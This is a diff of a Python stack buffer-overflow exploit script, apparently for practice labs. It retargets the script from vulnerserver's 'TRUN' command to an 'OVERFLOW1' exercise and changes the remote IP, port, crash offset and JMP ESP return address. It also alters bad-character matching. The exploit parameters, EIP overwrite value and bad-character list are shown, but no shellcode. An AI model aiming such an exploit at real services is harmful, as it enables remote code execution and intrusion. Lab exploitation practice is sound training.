@@ -13,13 +13,13 @@ logging.basicConfig(filename='logs',
                     datefmt='%d/%m/%Y %I:%M:%S %p')
 
 init(autoreset=True) # Colorama auto reset settings
-IP = ('192.168.0.110').encode('latin-1') # Update your Remote IP Address
-CRASH = 2100 # Size of the total payload when EXE crashed
-PORT = 9999 # Remote Port where the EXE is listening
+IP = ('192.168.247.136').encode('latin-1') # Update your Remote IP Address
+CRASH = 2000 # Size of the total payload when EXE crashed
+PORT = 1337 # Remote Port where the EXE is listening
 EBP = 1978 # Total Size of the EBP
-EIP = '\x50\x11\xaf\x62' # Address of JMP ESP to be replaced in EIP
+EIP = '\xaf\x11\x50\x62' # Address of JMP ESP to be replaced in EIP
 NOPS = 30 # Size of NOPS
-cmd = "TRUN /.:/" # Name of the Vulnerable variable
+cmd = "OVERFLOW1 " # Name of the Vulnerable variable
 
 badcharlist = (
   "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
@@ -156,7 +156,7 @@ def remove_badchars(badchar):
         
         logging.info("Spliting the Badchar with Comma Delimiter")
         for i in b.split(','):
-            if i == badchar:
+            if i in badchar.split(","):
                 Flag = True
                 
             try:
